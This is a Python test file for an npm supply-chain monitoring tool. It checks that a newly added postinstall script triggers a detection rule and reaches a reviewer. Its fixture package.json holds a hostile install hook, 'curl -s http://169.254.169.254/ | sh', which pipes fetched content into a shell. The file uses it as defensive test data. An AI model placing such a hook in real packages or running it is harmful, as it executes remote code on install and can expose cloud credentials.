"""A lifecycle script in package.json is the most common npm attack. It must reach the rules and the reviewer."""
import io
import tarfile

from npmdiffwatch import differ, engine, fetcher, reviewer
from npmdiffwatch.config import Config
from npmdiffwatch.models import ArtifactSet
from npmdiffwatch.orchestrator import _load_ruleset

PKG = b'{"name": "p", "version": "1.0.1", "scripts": {"postinstall": "curl -s http://169.254.169.254/ | sh"}}'


def _tgz(members):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for name, data in members:
            ti = tarfile.TarInfo(name=name)
            ti.size = len(data)
            tar.addfile(ti, io.BytesIO(data))
    return buf.getvalue()


def test_an_added_postinstall_script_fires_the_rule_and_reaches_the_reviewer():
    cfg = Config()
    new, _, _, _ = fetcher.extract_tgz(_tgz([("package/package.json", PKG), ("package/index.js", b"module.exports=1\n")]), cfg)
    old, _, _, _ = fetcher.extract_tgz(_tgz([("package/package.json", b'{"name": "p", "version": "1.0.0"}'),
                                            ("package/index.js", b"module.exports=1\n")]), cfg)
    d = differ.build_diff(ArtifactSet("p", "1.0.1", "1.0.0", "tgz", new, old, {}))
    tr = engine.triage(d, cfg, _load_ruleset(cfg))
    assert "pkg-install-scripts" in {r.rule for r in tr.fired_rules}
    assert "169.254.169.254" in reviewer.build_review_input(d, tr, max_chars=cfg.reviewer.max_input_chars)


def _first_release(pkg_json):
    cfg = Config()
    new, _, _, _ = fetcher.extract_tgz(_tgz([("package/package.json", pkg_json), ("package/index.js", b"module.exports=1\n")]), cfg)
    d = differ.build_diff(ArtifactSet("p", "1.0.0", None, "tgz", new, {}, {}))
    return d, engine.triage(d, cfg, _load_ruleset(cfg))


def test_an_install_script_on_a_first_release_fires_and_reaches_the_reviewer():
    d, tr = _first_release(PKG)
    assert "pkg-install-scripts" in {r.rule for r in tr.fired_rules}
    assert "169.254.169.254" in reviewer.build_review_input(d, tr, max_chars=Config().reviewer.max_input_chars)


def test_a_first_release_is_not_scored_for_simply_having_main_bin_or_dependencies():
    _, tr = _first_release(b'{"name": "p", "main": "index.js", "bin": {"p": "cli.js"}, '
                           b'"dependencies": {"left-pad": "1.3.0"}, "scripts": {"test": "jest"}}')
    assert not {r.rule for r in tr.fired_rules} & {"pkg-main-rewrite", "pkg-bin-rewrite", "pkg-new-dependency"}
